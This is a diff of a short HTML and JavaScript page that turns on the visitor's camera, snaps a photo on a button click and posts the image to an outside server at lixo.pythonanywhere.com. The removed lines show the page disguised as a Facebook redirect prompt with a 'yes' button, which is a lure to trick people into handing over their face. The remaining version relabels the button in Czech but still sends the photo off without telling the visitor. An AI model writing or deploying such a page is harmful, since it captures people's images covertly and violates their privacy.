@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>facebook wants to redirect to profile </title>
+  <title>Pořiď fotku z kamery</title>
 </head>
 <body>
   <video id="video" width="320" height="240" autoplay playsinline></video>
-  <button id="snap">yes</button>
+  <button id="snap">Pořiď fotku</button>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
   <script>
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    })
-    .then(stream => {
-      document.getElementById('video').srcObject = stream;
-    })
-    .catch(error => {
-      alert("Kamera nebyla povolena nebo nastala chyba: " + error);
-    });
+    // Povolení kamery
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        document.getElementById('video').srcObject = stream;
+      })
+      .catch(error => {
+        alert("Kamera nebyla povolena nebo nastala chyba: " + error);
+      });
 
+    // Focení a odeslání fotky
     document.getElementById('snap').onclick = function() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
@@ -26,7 +26,6 @@
 
       const dataUrl = canvas.toDataURL('image/png');
 
-      // ODESÍLÁNÍ NA TVŮJ SERVER NA PYTHONANYWHERE
       fetch('https://lixo.pythonanywhere.com/upload', {
         method: 'POST',
         body: JSON.stringify({ image: dataUrl }),
